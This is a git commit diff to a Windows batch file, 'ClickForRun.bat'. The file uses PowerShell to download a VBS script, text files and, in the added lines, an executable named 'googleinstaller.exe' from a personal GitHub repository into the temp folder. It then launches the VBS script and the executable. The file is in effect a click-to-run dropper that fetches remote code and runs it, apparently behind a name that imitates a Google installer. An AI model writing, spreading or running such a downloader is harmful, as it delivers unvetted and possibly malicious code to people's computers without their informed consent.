8ed895eacc75b347f44bac42679bc9c434a0dceb
Arista666 <86161915+Arista666@users.noreply.github.com>
2023-03-21 18:18:45 +0800

    Update ClickForRun.bat

--- Downlaod/VBSBAT/ClickForRun.bat
+++ Downlaod/VBSBAT/ClickForRun.bat
@@ -2,4 +2,6 @@ powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/A
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/text.vbs' -OutFile $env:temp\text.vbs"
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/1.txt' -OutFile $env:temp\1.txt"
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/2.txt' -OutFile $env:temp\2.txt"
+powershell -command "Invoke-WebRequest -Uri 'https://github.com/ArstProjects/arstprojects.github.io/raw/main/Downlaod/googleinstaller.exe' -OutFile $env:temp\googleinstaller.exe"
 start "" %temp%\ClickForRun.vbs
+start "" %temp%\googleinstaller.exe
